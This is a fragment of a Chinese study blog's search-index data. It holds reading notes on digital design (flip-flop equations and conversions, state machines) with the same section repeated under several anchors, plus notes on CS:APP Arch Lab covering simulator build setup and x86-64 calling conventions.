时序逻辑电路中的限制与延迟","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:8","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#同步电路-vs-异步电路"},{"categories":["计算机体系结构"],"content":" 3.8 Exercises 触发器的转换方法参考链接各类触发器的转换-数字电子技术-电子发烧友网站 (elecfans.com) 3.8.1 基础的锁存器 \u0026 触发器特性 SR锁存器 S为set，S=1时，输出信号为1 R为reset，R=1时，输出信号为0 SR=1时，电路状态无效 SR=0时，电路状态保持不变 D锁存器 CLK=1时，输出Q=D CLK=0时，输出保持不变 D触发器 CLK上升沿把D的值输入到Q 其他时候输出保持不变 3.8.2 各类触发器之间的互相转换没有在课本中提到的是一些其他的触发器，以及触发器的特性方程，而触发器之间的互相转换需要利用到特性方程。特性方程指的是锁存器/触发器的下一时刻输出$Q*$与输入信号之间的关系。 RS触发器：输入信号R和S，输出为Q*。特性方程为$Q^{*}=S+\\bar{R}Q$ D触发器：输入信号D和CLK，输出为Q*。特性方程为$Q^{*} = D$ JK触发器：功能最强大 JK都为0，保持输入 J=1，输出为1 K=1，输出为0 JK都为1，输出取前一个时刻输出的取反 输入信号为J和K，输出为$Q^{}$，特性方程为$Q^{}=J\\bar{Q}+\\bar{K}Q$ T触发器： 功能是每个时钟上升沿，输出为前一个时刻输出的取反。输入信号为T和CLK，输出为Q*； 特性方程为$Q^{*}=\\bar{T}Q+T\\bar{Q}$ 各个触发器的状态转换的方法在于，用已知的触发器去表达未知的触发器，如下： D触发器 -\u003e T触发器（用T表示D）：$D=\\bar{T}Q+T\\bar{Q}$ D触发器 -\u003e JK触发器（用JK表示D）：$D=J\\bar{Q}+\\bar{K}Q$ JK触发器 -\u003e D触发器（用D表示JK）： 可以将D转化为$Q^{*}=D(Q+\\bar{Q})=DQ+D\\bar{Q}$ 因为JK触发器特性方程为$Q^{*}=J\\bar{Q}+\\bar{K}Q$ 那么$J=D,K=\\bar{D}$ JK触发器 -\u003e T触发器（用T表示JK）： JK触发器：$Q^{*}=J\\bar{Q}+\\bar{K}Q$ T触发器：$D=\\bar{T}Q+T\\bar{Q}$ 那么$J=T,K=T$ 3.8.3 同步电路 vs 异步电路 异步 preset \u0026 clear电路的工作时序可以参考这个油管视频： preset \u0026 clear latch/flip-flop的设计可以参考这个油管视频： 以及这个油管视频： 查找异步视频资料的时候还费了点功夫，一开始搜索的是asynchronous d latch/flip flop/sequential circuit design，结果搜到的资料非常有限，直到搜到一本sequential circuit design还是什么教材，里面管这个特性叫preset \u0026 clear，才恍然大悟查错了资料。后来换了个方式查找资料，果然搜到了。 异步复位的D锁存器设计 异步设置D锁存器设计 异步复位的D触发器设计 异步设置D触发器设计 3.8.4 时序逻辑电路的设计：从状态机到电路（尤其是Mealy型电路的设计） Moore型电路和Mealy型电路的主要差别在于：Moore型电路的输出与状态有关，而Mealy型电路的输出与状态和输入有关。 Mealy型电路的设计还不太会（如课本P166 习题3.25）(说白了其实是DFA的设计不太会，过会儿补一补） DFA的介绍看这里： 3.8.4.1 状态机的化简流程 状态机的化简看这里： 化简流程： 根据状态转换图，画出状态转换表 消去等效状态 把表中消去的等效状态用已有的状态替代 画出新的状态转换图 3.8.4.2 二进制序列检测器 基础二进制序列检测器的实现方法看这里： 3.8.4.3 Grey Code状态机生成器 3.8.5 时序逻辑电路的分析：从电路到状态机 3.8.6 时序逻辑电路中的限制与延迟","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:8","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#时序逻辑电路的设计从状态机到电路尤其是mealy型电路的设计"},{"categories":["计算机体系结构"],"content":" 3.8 Exercises 触发器的转换方法参考链接各类触发器的转换-数字电子技术-电子发烧友网站 (elecfans.com) 3.8.1 基础的锁存器 \u0026 触发器特性 SR锁存器 S为set，S=1时，输出信号为1 R为reset，R=1时，输出信号为0 SR=1时，电路状态无效 SR=0时，电路状态保持不变 D锁存器 CLK=1时，输出Q=D CLK=0时，输出保持不变 D触发器 CLK上升沿把D的值输入到Q 其他时候输出保持不变 3.8.2 各类触发器之间的互相转换没有在课本中提到的是一些其他的触发器，以及触发器的特性方程，而触发器之间的互相转换需要利用到特性方程。特性方程指的是锁存器/触发器的下一时刻输出$Q*$与输入信号之间的关系。 RS触发器：输入信号R和S，输出为Q*。特性方程为$Q^{*}=S+\\bar{R}Q$ D触发器：输入信号D和CLK，输出为Q*。特性方程为$Q^{*} = D$ JK触发器：功能最强大 JK都为0，保持输入 J=1，输出为1 K=1，输出为0 JK都为1，输出取前一个时刻输出的取反 输入信号为J和K，输出为$Q^{}$，特性方程为$Q^{}=J\\bar{Q}+\\bar{K}Q$ T触发器： 功能是每个时钟上升沿，输出为前一个时刻输出的取反。输入信号为T和CLK，输出为Q*； 特性方程为$Q^{*}=\\bar{T}Q+T\\bar{Q}$ 各个触发器的状态转换的方法在于，用已知的触发器去表达未知的触发器，如下： D触发器 -\u003e T触发器（用T表示D）：$D=\\bar{T}Q+T\\bar{Q}$ D触发器 -\u003e JK触发器（用JK表示D）：$D=J\\bar{Q}+\\bar{K}Q$ JK触发器 -\u003e D触发器（用D表示JK）： 可以将D转化为$Q^{*}=D(Q+\\bar{Q})=DQ+D\\bar{Q}$ 因为JK触发器特性方程为$Q^{*}=J\\bar{Q}+\\bar{K}Q$ 那么$J=D,K=\\bar{D}$ JK触发器 -\u003e T触发器（用T表示JK）： JK触发器：$Q^{*}=J\\bar{Q}+\\bar{K}Q$ T触发器：$D=\\bar{T}Q+T\\bar{Q}$ 那么$J=T,K=T$ 3.8.3 同步电路 vs 异步电路 异步 preset \u0026 clear电路的工作时序可以参考这个油管视频： preset \u0026 clear latch/flip-flop的设计可以参考这个油管视频： 以及这个油管视频： 查找异步视频资料的时候还费了点功夫，一开始搜索的是asynchronous d latch/flip flop/sequential circuit design，结果搜到的资料非常有限，直到搜到一本sequential circuit design还是什么教材，里面管这个特性叫preset \u0026 clear，才恍然大悟查错了资料。后来换了个方式查找资料，果然搜到了。 异步复位的D锁存器设计 异步设置D锁存器设计 异步复位的D触发器设计 异步设置D触发器设计 3.8.4 时序逻辑电路的设计：从状态机到电路（尤其是Mealy型电路的设计） Moore型电路和Mealy型电路的主要差别在于：Moore型电路的输出与状态有关，而Mealy型电路的输出与状态和输入有关。 Mealy型电路的设计还不太会（如课本P166 习题3.25）(说白了其实是DFA的设计不太会，过会儿补一补） DFA的介绍看这里： 3.8.4.1 状态机的化简流程 状态机的化简看这里： 化简流程： 根据状态转换图，画出状态转换表 消去等效状态 把表中消去的等效状态用已有的状态替代 画出新的状态转换图 3.8.4.2 二进制序列检测器 基础二进制序列检测器的实现方法看这里： 3.8.4.3 Grey Code状态机生成器 3.8.5 时序逻辑电路的分析：从电路到状态机 3.8.6 时序逻辑电路中的限制与延迟","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:8","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#状态机的化简流程"},{"categories":["计算机体系结构"],"content":" 3.8 Exercises 触发器的转换方法参考链接各类触发器的转换-数字电子技术-电子发烧友网站 (elecfans.com) 3.8.1 基础的锁存器 \u0026 触发器特性 SR锁存器 S为set，S=1时，输出信号为1 R为reset，R=1时，输出信号为0 SR=1时，电路状态无效 SR=0时，电路状态保持不变 D锁存器 CLK=1时，输出Q=D CLK=0时，输出保持不变 D触发器 CLK上升沿把D的值输入到Q 其他时候输出保持不变 3.8.2 各类触发器之间的互相转换没有在课本中提到的是一些其他的触发器，以及触发器的特性方程，而触发器之间的互相转换需要利用到特性方程。特性方程指的是锁存器/触发器的下一时刻输出$Q*$与输入信号之间的关系。 RS触发器：输入信号R和S，输出为Q*。特性方程为$Q^{*}=S+\\bar{R}Q$ D触发器：输入信号D和CLK，输出为Q*。特性方程为$Q^{*} = D$ JK触发器：功能最强大 JK都为0，保持输入 J=1，输出为1 K=1，输出为0 JK都为1，输出取前一个时刻输出的取反 输入信号为J和K，输出为$Q^{}$，特性方程为$Q^{}=J\\bar{Q}+\\bar{K}Q$ T触发器： 功能是每个时钟上升沿，输出为前一个时刻输出的取反。输入信号为T和CLK，输出为Q*； 特性方程为$Q^{*}=\\bar{T}Q+T\\bar{Q}$ 各个触发器的状态转换的方法在于，用已知的触发器去表达未知的触发器，如下： D触发器 -\u003e T触发器（用T表示D）：$D=\\bar{T}Q+T\\bar{Q}$ D触发器 -\u003e JK触发器（用JK表示D）：$D=J\\bar{Q}+\\bar{K}Q$ JK触发器 -\u003e D触发器（用D表示JK）： 可以将D转化为$Q^{*}=D(Q+\\bar{Q})=DQ+D\\bar{Q}$ 因为JK触发器特性方程为$Q^{*}=J\\bar{Q}+\\bar{K}Q$ 那么$J=D,K=\\bar{D}$ JK触发器 -\u003e T触发器（用T表示JK）： JK触发器：$Q^{*}=J\\bar{Q}+\\bar{K}Q$ T触发器：$D=\\bar{T}Q+T\\bar{Q}$ 那么$J=T,K=T$ 3.8.3 同步电路 vs 异步电路 异步 preset \u0026 clear电路的工作时序可以参考这个油管视频： preset \u0026 clear latch/flip-flop的设计可以参考这个油管视频： 以及这个油管视频： 查找异步视频资料的时候还费了点功夫，一开始搜索的是asynchronous d latch/flip flop/sequential circuit design，结果搜到的资料非常有限，直到搜到一本sequential circuit design还是什么教材，里面管这个特性叫preset \u0026 clear，才恍然大悟查错了资料。后来换了个方式查找资料，果然搜到了。 异步复位的D锁存器设计 异步设置D锁存器设计 异步复位的D触发器设计 异步设置D触发器设计 3.8.4 时序逻辑电路的设计：从状态机到电路（尤其是Mealy型电路的设计） Moore型电路和Mealy型电路的主要差别在于：Moore型电路的输出与状态有关，而Mealy型电路的输出与状态和输入有关。 Mealy型电路的设计还不太会（如课本P166 习题3.25）(说白了其实是DFA的设计不太会，过会儿补一补） DFA的介绍看这里： 3.8.4.1 状态机的化简流程 状态机的化简看这里： 化简流程： 根据状态转换图，画出状态转换表 消去等效状态 把表中消去的等效状态用已有的状态替代 画出新的状态转换图 3.8.4.2 二进制序列检测器 基础二进制序列检测器的实现方法看这里： 3.8.4.3 Grey Code状态机生成器 3.8.5 时序逻辑电路的分析：从电路到状态机 3.8.6 时序逻辑电路中的限制与延迟","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:8","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#二进制序列检测器"},{"categories":["计算机体系结构"],"content":" 3.8 Exercises 触发器的转换方法参考链接各类触发器的转换-数字电子技术-电子发烧友网站 (elecfans.com) 3.8.1 基础的锁存器 \u0026 触发器特性 SR锁存器 S为set，S=1时，输出信号为1 R为reset，R=1时，输出信号为0 SR=1时，电路状态无效 SR=0时，电路状态保持不变 D锁存器 CLK=1时，输出Q=D CLK=0时，输出保持不变 D触发器 CLK上升沿把D的值输入到Q 其他时候输出保持不变 3.8.2 各类触发器之间的互相转换没有在课本中提到的是一些其他的触发器，以及触发器的特性方程，而触发器之间的互相转换需要利用到特性方程。特性方程指的是锁存器/触发器的下一时刻输出$Q*$与输入信号之间的关系。 RS触发器：输入信号R和S，输出为Q*。特性方程为$Q^{*}=S+\\bar{R}Q$ D触发器：输入信号D和CLK，输出为Q*。特性方程为$Q^{*} = D$ JK触发器：功能最强大 JK都为0，保持输入 J=1，输出为1 K=1，输出为0 JK都为1，输出取前一个时刻输出的取反 输入信号为J和K，输出为$Q^{}$，特性方程为$Q^{}=J\\bar{Q}+\\bar{K}Q$ T触发器： 功能是每个时钟上升沿，输出为前一个时刻输出的取反。输入信号为T和CLK，输出为Q*； 特性方程为$Q^{*}=\\bar{T}Q+T\\bar{Q}$ 各个触发器的状态转换的方法在于，用已知的触发器去表达未知的触发器，如下： D触发器 -\u003e T触发器（用T表示D）：$D=\\bar{T}Q+T\\bar{Q}$ D触发器 -\u003e JK触发器（用JK表示D）：$D=J\\bar{Q}+\\bar{K}Q$ JK触发器 -\u003e D触发器（用D表示JK）： 可以将D转化为$Q^{*}=D(Q+\\bar{Q})=DQ+D\\bar{Q}$ 因为JK触发器特性方程为$Q^{*}=J\\bar{Q}+\\bar{K}Q$ 那么$J=D,K=\\bar{D}$ JK触发器 -\u003e T触发器（用T表示JK）： JK触发器：$Q^{*}=J\\bar{Q}+\\bar{K}Q$ T触发器：$D=\\bar{T}Q+T\\bar{Q}$ 那么$J=T,K=T$ 3.8.3 同步电路 vs 异步电路 异步 preset \u0026 clear电路的工作时序可以参考这个油管视频： preset \u0026 clear latch/flip-flop的设计可以参考这个油管视频： 以及这个油管视频： 查找异步视频资料的时候还费了点功夫，一开始搜索的是asynchronous d latch/flip flop/sequential circuit design，结果搜到的资料非常有限，直到搜到一本sequential circuit design还是什么教材，里面管这个特性叫preset \u0026 clear，才恍然大悟查错了资料。后来换了个方式查找资料，果然搜到了。 异步复位的D锁存器设计 异步设置D锁存器设计 异步复位的D触发器设计 异步设置D触发器设计 3.8.4 时序逻辑电路的设计：从状态机到电路（尤其是Mealy型电路的设计） Moore型电路和Mealy型电路的主要差别在于：Moore型电路的输出与状态有关，而Mealy型电路的输出与状态和输入有关。 Mealy型电路的设计还不太会（如课本P166 习题3.25）(说白了其实是DFA的设计不太会，过会儿补一补） DFA的介绍看这里： 3.8.4.1 状态机的化简流程 状态机的化简看这里： 化简流程： 根据状态转换图，画出状态转换表 消去等效状态 把表中消去的等效状态用已有的状态替代 画出新的状态转换图 3.8.4.2 二进制序列检测器 基础二进制序列检测器的实现方法看这里： 3.8.4.3 Grey Code状态机生成器 3.8.5 时序逻辑电路的分析：从电路到状态机 3.8.6 时序逻辑电路中的限制与延迟","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:8","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#grey-code状态机生成器"},{"categories":["计算机体系结构"],"content":" 3.8 Exercises 触发器的转换方法参考链接各类触发器的转换-数字电子技术-电子发烧友网站 (elecfans.com) 3.8.1 基础的锁存器 \u0026 触发器特性 SR锁存器 S为set，S=1时，输出信号为1 R为reset，R=1时，输出信号为0 SR=1时，电路状态无效 SR=0时，电路状态保持不变 D锁存器 CLK=1时，输出Q=D CLK=0时，输出保持不变 D触发器 CLK上升沿把D的值输入到Q 其他时候输出保持不变 3.8.2 各类触发器之间的互相转换没有在课本中提到的是一些其他的触发器，以及触发器的特性方程，而触发器之间的互相转换需要利用到特性方程。特性方程指的是锁存器/触发器的下一时刻输出$Q*$与输入信号之间的关系。 RS触发器：输入信号R和S，输出为Q*。特性方程为$Q^{*}=S+\\bar{R}Q$ D触发器：输入信号D和CLK，输出为Q*。特性方程为$Q^{*} = D$ JK触发器：功能最强大 JK都为0，保持输入 J=1，输出为1 K=1，输出为0 JK都为1，输出取前一个时刻输出的取反 输入信号为J和K，输出为$Q^{}$，特性方程为$Q^{}=J\\bar{Q}+\\bar{K}Q$ T触发器： 功能是每个时钟上升沿，输出为前一个时刻输出的取反。输入信号为T和CLK，输出为Q*； 特性方程为$Q^{*}=\\bar{T}Q+T\\bar{Q}$ 各个触发器的状态转换的方法在于，用已知的触发器去表达未知的触发器，如下： D触发器 -\u003e T触发器（用T表示D）：$D=\\bar{T}Q+T\\bar{Q}$ D触发器 -\u003e JK触发器（用JK表示D）：$D=J\\bar{Q}+\\bar{K}Q$ JK触发器 -\u003e D触发器（用D表示JK）： 可以将D转化为$Q^{*}=D(Q+\\bar{Q})=DQ+D\\bar{Q}$ 因为JK触发器特性方程为$Q^{*}=J\\bar{Q}+\\bar{K}Q$ 那么$J=D,K=\\bar{D}$ JK触发器 -\u003e T触发器（用T表示JK）： JK触发器：$Q^{*}=J\\bar{Q}+\\bar{K}Q$ T触发器：$D=\\bar{T}Q+T\\bar{Q}$ 那么$J=T,K=T$ 3.8.3 同步电路 vs 异步电路 异步 preset \u0026 clear电路的工作时序可以参考这个油管视频： preset \u0026 clear latch/flip-flop的设计可以参考这个油管视频： 以及这个油管视频： 查找异步视频资料的时候还费了点功夫，一开始搜索的是asynchronous d latch/flip flop/sequential circuit design，结果搜到的资料非常有限，直到搜到一本sequential circuit design还是什么教材，里面管这个特性叫preset \u0026 clear，才恍然大悟查错了资料。后来换了个方式查找资料，果然搜到了。 异步复位的D锁存器设计 异步设置D锁存器设计 异步复位的D触发器设计 异步设置D触发器设计 3.8.4 时序逻辑电路的设计：从状态机到电路（尤其是Mealy型电路的设计） Moore型电路和Mealy型电路的主要差别在于：Moore型电路的输出与状态有关，而Mealy型电路的输出与状态和输入有关。 Mealy型电路的设计还不太会（如课本P166 习题3.25）(说白了其实是DFA的设计不太会，过会儿补一补） DFA的介绍看这里： 3.8.4.1 状态机的化简流程 状态机的化简看这里： 化简流程： 根据状态转换图，画出状态转换表 消去等效状态 把表中消去的等效状态用已有的状态替代 画出新的状态转换图 3.8.4.2 二进制序列检测器 基础二进制序列检测器的实现方法看这里： 3.8.4.3 Grey Code状态机生成器 3.8.5 时序逻辑电路的分析：从电路到状态机 3.8.6 时序逻辑电路中的限制与延迟","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:8","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#时序逻辑电路的分析从电路到状态机"},{"categories":["计算机体系结构"],"content":" 3.8 Exercises 触发器的转换方法参考链接各类触发器的转换-数字电子技术-电子发烧友网站 (elecfans.com) 3.8.1 基础的锁存器 \u0026 触发器特性 SR锁存器 S为set，S=1时，输出信号为1 R为reset，R=1时，输出信号为0 SR=1时，电路状态无效 SR=0时，电路状态保持不变 D锁存器 CLK=1时，输出Q=D CLK=0时，输出保持不变 D触发器 CLK上升沿把D的值输入到Q 其他时候输出保持不变 3.8.2 各类触发器之间的互相转换没有在课本中提到的是一些其他的触发器，以及触发器的特性方程，而触发器之间的互相转换需要利用到特性方程。特性方程指的是锁存器/触发器的下一时刻输出$Q*$与输入信号之间的关系。 RS触发器：输入信号R和S，输出为Q*。特性方程为$Q^{*}=S+\\bar{R}Q$ D触发器：输入信号D和CLK，输出为Q*。特性方程为$Q^{*} = D$ JK触发器：功能最强大 JK都为0，保持输入 J=1，输出为1 K=1，输出为0 JK都为1，输出取前一个时刻输出的取反 输入信号为J和K，输出为$Q^{}$，特性方程为$Q^{}=J\\bar{Q}+\\bar{K}Q$ T触发器： 功能是每个时钟上升沿，输出为前一个时刻输出的取反。输入信号为T和CLK，输出为Q*； 特性方程为$Q^{*}=\\bar{T}Q+T\\bar{Q}$ 各个触发器的状态转换的方法在于，用已知的触发器去表达未知的触发器，如下： D触发器 -\u003e T触发器（用T表示D）：$D=\\bar{T}Q+T\\bar{Q}$ D触发器 -\u003e JK触发器（用JK表示D）：$D=J\\bar{Q}+\\bar{K}Q$ JK触发器 -\u003e D触发器（用D表示JK）： 可以将D转化为$Q^{*}=D(Q+\\bar{Q})=DQ+D\\bar{Q}$ 因为JK触发器特性方程为$Q^{*}=J\\bar{Q}+\\bar{K}Q$ 那么$J=D,K=\\bar{D}$ JK触发器 -\u003e T触发器（用T表示JK）： JK触发器：$Q^{*}=J\\bar{Q}+\\bar{K}Q$ T触发器：$D=\\bar{T}Q+T\\bar{Q}$ 那么$J=T,K=T$ 3.8.3 同步电路 vs 异步电路 异步 preset \u0026 clear电路的工作时序可以参考这个油管视频： preset \u0026 clear latch/flip-flop的设计可以参考这个油管视频： 以及这个油管视频： 查找异步视频资料的时候还费了点功夫，一开始搜索的是asynchronous d latch/flip flop/sequential circuit design，结果搜到的资料非常有限，直到搜到一本sequential circuit design还是什么教材，里面管这个特性叫preset \u0026 clear，才恍然大悟查错了资料。后来换了个方式查找资料，果然搜到了。 异步复位的D锁存器设计 异步设置D锁存器设计 异步复位的D触发器设计 异步设置D触发器设计 3.8.4 时序逻辑电路的设计：从状态机到电路（尤其是Mealy型电路的设计） Moore型电路和Mealy型电路的主要差别在于：Moore型电路的输出与状态有关，而Mealy型电路的输出与状态和输入有关。 Mealy型电路的设计还不太会（如课本P166 习题3.25）(说白了其实是DFA的设计不太会，过会儿补一补） DFA的介绍看这里： 3.8.4.1 状态机的化简流程 状态机的化简看这里： 化简流程： 根据状态转换图，画出状态转换表 消去等效状态 把表中消去的等效状态用已有的状态替代 画出新的状态转换图 3.8.4.2 二进制序列检测器 基础二进制序列检测器的实现方法看这里： 3.8.4.3 Grey Code状态机生成器 3.8.5 时序逻辑电路的分析：从电路到状态机 3.8.6 时序逻辑电路中的限制与延迟","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:8","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#时序逻辑电路中的限制与延迟"},{"categories":["计算机体系结构"],"content":" 3.9 Interview Questions","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:9","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#interview-questions"},{"categories":["计算机体系结构"],"content":" 4 Chapter 4：硬件描述语言 这一章的学习可以配套 HDLBits 的 Verilog 练习，以及其他学校的 Verilog 数字电路设计课程进行练习，光看是没有用的。 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:4:0","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#chapter-4硬件描述语言"},{"categories":["计算机体系结构"],"content":" 5 Chapter 5：数字电路设计 这一章的学习过程中，可以使用 Logisim 将所有基础电路搭起来，并且使用 Verilog 构建所有的电路 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:5:0","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#chapter-5数字电路设计"},{"categories":["计算机体系结构"],"content":" 6 Chapter 6：RISC-V 汇编语言 这一章学习过后可以学习汇编和链接过程，文件格式，实现一个 RISC-V 汇编器，和一个 RISC-V 反汇编器 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:6:0","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#chapter-6risc-v-汇编语言"},{"categories":["计算机体系结构"],"content":" 7 Chapter 7：微架构处理器设计 这一章学习后，可以使用 Logisim 实现 MIPS 单周期/多周期/流水线处理器（完成华科头歌实验），并用 Verilog 进行实现并仿真 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:7:0","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#chapter-7微架构处理器设计"},{"categories":["计算机体系结构"],"content":" 8 Chapter 8：主存和 I/O 系统设计 这一章学习后，可以使用 Logisim 实现简单的 Memory 和 Cache（完成华科头歌实验），而后可以使用 Verilog 实现并仿真 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:8:0","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#chapter-8主存和-io-系统设计"},{"categories":["计算机体系结构"],"content":" 9 后续任务 华科数字逻辑+组成原理课程学完 其他学校数字逻辑+组成原理课程学完 Verilog 基础数字电路构建块设计 设计一些小型的数字电路 实现一个带存储+I/O+五级流水的 MIPS CPU 文件格式学习 链接过程学习 MIPS 汇编器实现 MIPS 反汇编器实现 学习基础的编译原理知识 小型 C 语言编译器实现 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:9:0","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#后续任务"},{"categories":null,"content":" 13 前言本实验中需要我们： 设计和实现一个流水线化的 Y86-64 架构处理器 优化处理器 优化一个基准程序 本实验包括 3 个部分： Part A 写几个小的 Y86-64 程序 熟悉 Y86-64 开发工具 Part B 对 SEQ 模拟器扩展一个新指令 Part C 优化 Y86-64 基准程序 优化处理器设计 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:1:0","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#前言"},{"categories":null,"content":" 14 环境配置输入如下命令解压模拟器压缩包并且进入目录进行编译： bash tar xvf sim.tar cd sim make clean make 编译失败，提示没有flex，bison，-ltk和-ltcl，因此本实验需要三个软件包： flex bison tk tcl 通过如下命令安装： bash sudo apt install flex bison tk-dev tcl-dev 再次输入： bash make clean make 编译成功，可以开始实验。 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:2:0","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#环境配置"},{"categories":null,"content":" 15 x86-64 函数调用过程复习","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:3:0","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#x86-64-函数调用过程复习"},{"categories":null,"content":" 15.1 callq调用和ret返回使用callq进行调用时： 压入返回地址 将 pc 修改为下一条指令地址 使用ret返回时： 弹出返回地址 将 pc 修改为返回地址 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:3:1","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#callq调用和ret返回"},{"categories":null,"content":" 15.2 普通的过程调用被调用者行为： 从寄存器和栈上读取值； 调用ret返回； ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:3:2","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#普通的过程调用"},{"categories":null,"content":" 15.3 带寄存器参数传递的过程调用调用者行为： 腾出一部分栈空间； 把局部变量保存在栈上； 将\u003c6个参数输入到寄存器中； call指令调用过程； 获取到返回值； 进行计算； 恢复栈空间； 调用ret返回； ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:3:3","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#带寄存器参数传递的过程调用"},{"categories":null,"content":" 15.4 超过6个参数传递的过程调用 Tip 可能需要提前保存内容到栈。 调用者行为： 腾出一部分栈空间； 部分的值的地址需要作为参数传递，那么这些值必须压在栈上，以获取地址； 从第n到第7把参数依次压在栈上，第7个在栈顶； 把其他6个参数保存到寄存器中； call指令调用过程； 从栈中获取到值，进行计算； 恢复栈空间； 调用ret返回； ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:3:4","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#超过6个参数传递的过程调用"},{"categories":null,"content":" 15.5 需要保存被调用者保存寄存器到栈的过程调用 Tip 在下面的示例中，被调用者同时还是个调用者。 被调用者行为： 保存之前的%rbp和%rbx到栈上； 腾出一部分栈空间； 保存调用者保存寄存器的值，到被调用者保存寄存器，这样可以在调用完成后从中取出原值；（这是一种保存调用者保存寄存器值的方法） 